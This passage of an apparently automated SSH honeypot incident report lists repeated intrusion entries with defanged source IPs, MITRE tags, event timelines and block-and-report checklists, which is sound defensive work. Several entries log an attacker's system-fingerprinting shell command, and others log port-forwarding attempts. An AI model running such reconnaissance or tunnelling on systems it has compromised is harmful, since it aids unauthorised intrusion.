| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:23:05` | `cowrie.session.connect` |
| `2026-08-23 13:23:06` | `cowrie.client.version` |
| `2026-08-23 13:23:06` | `cowrie.client.kex` |
| `2026-08-23 13:23:07` | `cowrie.login.success` |
| `2026-08-23 13:23:08` | `cowrie.session.params` |
| `2026-08-23 13:23:08` | `cowrie.command.input` |
| `2026-08-23 13:23:08` | `cowrie.command.input` |
| `2026-08-23 13:23:08` | `cowrie.command.input` |
| `2026-08-23 13:23:08` | `cowrie.command.input` |
| `2026-08-23 13:23:08` | `cowrie.command.input` |
| `2026-08-23 13:23:08` | `cowrie.command.success` |
| `2026-08-23 13:23:08` | `cowrie.command.input` |
| `2026-08-23 13:23:08` | `cowrie.command.input` |
| `2026-08-23 13:23:08` | `cowrie.command.input` |
| `2026-08-23 13:23:08` | `cowrie.command.input` |
| `2026-08-23 13:23:08` | `cowrie.log.closed` |
| `2026-08-23 13:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc5f1a566745

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:25 |
| **Last Seen** | 2026-08-23 13:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:25:31` | `cowrie.session.connect` |
| `2026-08-23 13:25:32` | `cowrie.client.version` |
| `2026-08-23 13:25:32` | `cowrie.client.kex` |
| `2026-08-23 13:25:33` | `cowrie.login.success` |
| `2026-08-23 13:25:34` | `cowrie.session.params` |
| `2026-08-23 13:25:34` | `cowrie.command.input` |
| `2026-08-23 13:25:34` | `cowrie.command.input` |
| `2026-08-23 13:25:34` | `cowrie.command.input` |
| `2026-08-23 13:25:34` | `cowrie.command.input` |
| `2026-08-23 13:25:34` | `cowrie.command.input` |
| `2026-08-23 13:25:34` | `cowrie.command.success` |
| `2026-08-23 13:25:34` | `cowrie.command.input` |
| `2026-08-23 13:25:34` | `cowrie.command.input` |
| `2026-08-23 13:25:34` | `cowrie.command.input` |
| `2026-08-23 13:25:34` | `cowrie.command.input` |
| `2026-08-23 13:25:35` | `cowrie.log.closed` |
| `2026-08-23 13:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4693dd0fb9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:26 |
| **Last Seen** | 2026-08-23 13:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:26:43` | `cowrie.session.connect` |
| `2026-08-23 13:26:43` | `cowrie.client.version` |
| `2026-08-23 13:26:43` | `cowrie.client.kex` |
| `2026-08-23 13:26:44` | `cowrie.login.success` |
| `2026-08-23 13:26:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:26:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:26:45` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9094727b58

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:26 |
| **Last Seen** | 2026-08-23 13:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:26:47` | `cowrie.session.connect` |
| `2026-08-23 13:26:47` | `cowrie.client.version` |
| `2026-08-23 13:26:50` | `cowrie.client.kex` |
| `2026-08-23 13:26:52` | `cowrie.login.success` |
| `2026-08-23 13:26:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:26:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:26:52` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b340a3842da

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:27 |
| **Last Seen** | 2026-08-23 13:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:27:58` | `cowrie.session.connect` |
| `2026-08-23 13:27:58` | `cowrie.client.version` |
| `2026-08-23 13:27:58` | `cowrie.client.kex` |
| `2026-08-23 13:27:59` | `cowrie.login.success` |
| `2026-08-23 13:28:00` | `cowrie.session.params` |
| `2026-08-23 13:28:00` | `cowrie.command.input` |
| `2026-08-23 13:28:00` | `cowrie.command.input` |
| `2026-08-23 13:28:00` | `cowrie.command.input` |
| `2026-08-23 13:28:00` | `cowrie.command.input` |
| `2026-08-23 13:28:00` | `cowrie.command.input` |
| `2026-08-23 13:28:00` | `cowrie.command.success` |
| `2026-08-23 13:28:00` | `cowrie.command.input` |
| `2026-08-23 13:28:00` | `cowrie.command.input` |
| `2026-08-23 13:28:00` | `cowrie.command.input` |
| `2026-08-23 13:28:00` | `cowrie.command.input` |
| `2026-08-23 13:28:01` | `cowrie.log.closed` |
| `2026-08-23 13:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16a914edf7a8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:30 |
| **Last Seen** | 2026-08-23 13:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:30:35` | `cowrie.session.connect` |
| `2026-08-23 13:30:35` | `cowrie.client.version` |
| `2026-08-23 13:30:35` | `cowrie.client.kex` |
| `2026-08-23 13:30:36` | `cowrie.login.success` |
| `2026-08-23 13:30:36` | `cowrie.session.params` |
| `2026-08-23 13:30:36` | `cowrie.command.input` |
| `2026-08-23 13:30:36` | `cowrie.command.input` |
| `2026-08-23 13:30:36` | `cowrie.command.input` |
| `2026-08-23 13:30:36` | `cowrie.command.input` |
| `2026-08-23 13:30:36` | `cowrie.command.input` |
| `2026-08-23 13:30:36` | `cowrie.command.success` |
| `2026-08-23 13:30:36` | `cowrie.command.input` |
| `2026-08-23 13:30:36` | `cowrie.command.input` |
| `2026-08-23 13:30:36` | `cowrie.command.input` |
| `2026-08-23 13:30:36` | `cowrie.command.input` |
| `2026-08-23 13:30:37` | `cowrie.log.closed` |
| `2026-08-23 13:30:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a494657b3096

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:33 |
| **Last Seen** | 2026-08-23 13:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:33:30` | `cowrie.session.connect` |
| `2026-08-23 13:33:30` | `cowrie.client.version` |
| `2026-08-23 13:33:30` | `cowrie.client.kex` |
| `2026-08-23 13:33:31` | `cowrie.login.success` |
| `2026-08-23 13:33:32` | `cowrie.session.params` |
| `2026-08-23 13:33:32` | `cowrie.command.input` |
| `2026-08-23 13:33:32` | `cowrie.command.input` |
| `2026-08-23 13:33:32` | `cowrie.command.input` |
| `2026-08-23 13:33:32` | `cowrie.command.input` |
| `2026-08-23 13:33:32` | `cowrie.command.input` |
| `2026-08-23 13:33:32` | `cowrie.command.success` |
| `2026-08-23 13:33:32` | `cowrie.command.input` |
| `2026-08-23 13:33:32` | `cowrie.command.input` |
| `2026-08-23 13:33:32` | `cowrie.command.input` |
| `2026-08-23 13:33:32` | `cowrie.command.input` |
| `2026-08-23 13:33:32` | `cowrie.log.closed` |
| `2026-08-23 13:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd299d6e84f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:36 |
| **Last Seen** | 2026-08-23 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:36:19` | `cowrie.session.connect` |
| `2026-08-23 13:36:19` | `cowrie.client.version` |
| `2026-08-23 13:36:20` | `cowrie.client.kex` |
| `2026-08-23 13:36:21` | `cowrie.login.success` |
| `2026-08-23 13:36:21` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:36:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:36:21` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-568e6e6ed561

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:36 |
| **Last Seen** | 2026-08-23 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:36:24` | `cowrie.session.connect` |
| `2026-08-23 13:36:24` | `cowrie.client.version` |
| `2026-08-23 13:36:24` | `cowrie.client.kex` |
| `2026-08-23 13:36:25` | `cowrie.login.success` |
| `2026-08-23 13:36:25` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:36:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:36:25` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4932705dcea

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:36 |
| **Last Seen** | 2026-08-23 13:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:36:31` | `cowrie.session.connect` |
| `2026-08-23 13:36:31` | `cowrie.client.version` |
| `2026-08-23 13:36:31` | `cowrie.client.kex` |
| `2026-08-23 13:36:33` | `cowrie.login.success` |
| `2026-08-23 13:36:33` | `cowrie.session.params` |
| `2026-08-23 13:36:33` | `cowrie.command.input` |
| `2026-08-23 13:36:33` | `cowrie.command.input` |
| `2026-08-23 13:36:33` | `cowrie.command.input` |
| `2026-08-23 13:36:33` | `cowrie.command.input` |
| `2026-08-23 13:36:33` | `cowrie.command.input` |
| `2026-08-23 13:36:33` | `cowrie.command.success` |
| `2026-08-23 13:36:33` | `cowrie.command.input` |
| `2026-08-23 13:36:33` | `cowrie.command.input` |
| `2026-08-23 13:36:33` | `cowrie.command.input` |
| `2026-08-23 13:36:33` | `cowrie.command.input` |
| `2026-08-23 13:36:34` | `cowrie.log.closed` |
| `2026-08-23 13:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-251b55928688

| Field | Detail |
|---|---|
| **Source IP** | `117.216.33[.]31` |
| **First Seen** | 2026-08-23 13:38 |
| **Last Seen** | 2026-08-23 13:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:38:06` | `cowrie.session.connect` |
| `2026-08-23 13:38:07` | `cowrie.client.version` |
| `2026-08-23 13:38:07` | `cowrie.client.kex` |
| `2026-08-23 13:38:09` | `cowrie.login.success` |
| `2026-08-23 13:38:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.216.33[.]31` to AbuseIPDB if not already reported
- [ ] Block `117.216.33[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-669ef093dc49

| Field | Detail |
|---|---|
| **Source IP** | `82.208.65[.]46` |
| **First Seen** | 2026-08-23 13:38 |
| **Last Seen** | 2026-08-23 13:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:38:15` | `cowrie.session.connect` |
| `2026-08-23 13:38:15` | `cowrie.client.version` |
| `2026-08-23 13:38:15` | `cowrie.client.kex` |
| `2026-08-23 13:38:17` | `cowrie.login.success` |
| `2026-08-23 13:38:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.208.65[.]46` to AbuseIPDB if not already reported
- [ ] Block `82.208.65[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05a094420c02

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:39 |
| **Last Seen** | 2026-08-23 13:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:39:10` | `cowrie.session.connect` |
| `2026-08-23 13:39:10` | `cowrie.client.version` |
| `2026-08-23 13:39:10` | `cowrie.client.kex` |
| `2026-08-23 13:39:12` | `cowrie.login.success` |
| `2026-08-23 13:39:13` | `cowrie.session.params` |
| `2026-08-23 13:39:13` | `cowrie.command.input` |
| `2026-08-23 13:39:13` | `cowrie.command.input` |
| `2026-08-23 13:39:13` | `cowrie.command.input` |
| `2026-08-23 13:39:13` | `cowrie.command.input` |
| `2026-08-23 13:39:13` | `cowrie.command.input` |
| `2026-08-23 13:39:13` | `cowrie.command.success` |
| `2026-08-23 13:39:13` | `cowrie.command.input` |
| `2026-08-23 13:39:13` | `cowrie.command.input` |
| `2026-08-23 13:39:13` | `cowrie.command.input` |
| `2026-08-23 13:39:13` | `cowrie.command.input` |
| `2026-08-23 13:39:13` | `cowrie.log.closed` |
| `2026-08-23 13:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5505212d0fb8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:41 |
| **Last Seen** | 2026-08-23 13:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:41:24` | `cowrie.session.connect` |
| `2026-08-23 13:41:25` | `cowrie.client.version` |
| `2026-08-23 13:41:25` | `cowrie.client.kex` |
| `2026-08-23 13:41:26` | `cowrie.login.success` |
| `2026-08-23 13:41:28` | `cowrie.session.params` |
| `2026-08-23 13:41:28` | `cowrie.command.input` |
| `2026-08-23 13:41:28` | `cowrie.command.input` |
| `2026-08-23 13:41:28` | `cowrie.command.input` |
| `2026-08-23 13:41:28` | `cowrie.command.input` |
| `2026-08-23 13:41:28` | `cowrie.command.input` |
| `2026-08-23 13:41:28` | `cowrie.command.success` |
| `2026-08-23 13:41:28` | `cowrie.command.input` |
| `2026-08-23 13:41:28` | `cowrie.command.input` |
| `2026-08-23 13:41:28` | `cowrie.command.input` |
| `2026-08-23 13:41:28` | `cowrie.command.input` |
| `2026-08-23 13:41:29` | `cowrie.log.closed` |
| `2026-08-23 13:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c5263842e8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 13:42 |
| **Last Seen** | 2026-08-23 13:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:42:17` | `cowrie.session.connect` |
| `2026-08-23 13:42:17` | `cowrie.client.version` |
| `2026-08-23 13:42:17` | `cowrie.client.kex` |
| `2026-08-23 13:42:18` | `cowrie.login.success` |
| `2026-08-23 13:42:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:42:18` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df49b167bc60

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:43 |
| **Last Seen** | 2026-08-23 13:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:43:32` | `cowrie.session.connect` |
| `2026-08-23 13:43:33` | `cowrie.client.version` |
| `2026-08-23 13:43:33` | `cowrie.client.kex` |
| `2026-08-23 13:43:34` | `cowrie.login.success` |
| `2026-08-23 13:43:36` | `cowrie.session.params` |
| `2026-08-23 13:43:36` | `cowrie.command.input` |
